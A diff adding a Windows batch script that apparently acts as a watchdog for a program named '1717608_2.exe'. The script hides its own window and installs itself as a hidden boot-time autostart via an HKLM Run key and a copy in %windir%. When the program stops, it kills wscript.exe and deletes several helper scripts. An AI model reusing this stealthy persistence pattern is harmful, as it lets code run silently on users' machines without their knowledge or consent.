@@ -1,0 +1,29 @@
+@echo off
+if "%1"=="h" goto begin
+start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
+
+:begin
+echo wscript.sleep 600 >%temp%\sl.vbs
+
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v sysstart /t REG_SZ /d %windir%\unstat.vbs /f >nul
+
+echo set objShell=wscript.createObject("wscript.shell")>%windir%\unstat.vbs
+echo iReturn=objShell.Run("cmd.exe /C %windir%\unstat.bat", 0, TRUE)>>%windir%\unstat.vbs
+copy /y %0 %windir%\unstat.bat
+:run
+tasklist | find /i "1717608_2.exe" || goto do
+
+cscript //nologo %temp%\sl.vbs
+
+goto run
+:do
+taskkill /f /im wscript.exe > nul 
+del snd_bckgrnd1.vbs>nul
+del snd_bckgrnd2.vbs>nul
+del snd_wn.vbs>nul
+del snd_drw.vbs>nul
+del snd_ls.vbs>nul
+del snd_allclr.vbs>nul
+del snd_gmvr.vbs>nul
+del lstn.bat>nul
+del /Q usr_online.vbs>nul
